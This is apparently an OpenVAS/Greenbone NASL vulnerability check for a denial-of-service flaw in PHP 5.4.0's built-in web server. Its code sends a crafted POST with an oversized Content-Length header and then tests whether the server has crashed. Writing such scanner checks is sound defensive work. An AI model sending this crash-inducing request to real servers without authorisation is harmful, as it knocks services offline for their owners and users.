if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902822" );
	script_bugtraq_id( 52704 );
	script_version( "2021-08-06T11:34:45+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-03-26 15:15:15 +0530 (Mon, 26 Mar 2012)" );
	script_name( "PHP Built-in WebServer 'Content-Length' Denial of Service Vulnerability" );
	script_xref( name: "URL", value: "https://bugs.php.net/bug.php?id=61461" );
	script_xref( name: "URL", value: "http://www.1337day.com/exploits/17831" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/52704" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/74317" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18665" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/111163/PHP-5.4.0-Denial-Of-Service.html" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_require_ports( "Services/www", 80 );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "affected", value: "PHP version 5.4.0." );
	script_tag( name: "insight", value: "The flaw is due to an error when processing HTTP request with a large
  'Content-Length' header value and can be exploited to cause a denial of
  service via a specially crafted packet." );
	script_tag( name: "solution", value: "Upgrade to PHP 5.4.1RC1-DEV or 5.5.0-DEV or later." );
	script_tag( name: "summary", value: "This host is running PHP Built-in WebServer and is prone to denial
  of service vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.


  NOTE: This NVT reports, if a similar vulnerability present in a different
  web-server." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
req = NASLString( "POST / HTTP/1.1\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: 2147483638\\r\\n\\r\\n", "A=B\\r\\n" );
res = http_send_recv( port: port, data: req );
if(http_is_dead( port: port )){
	security_message( port );
}

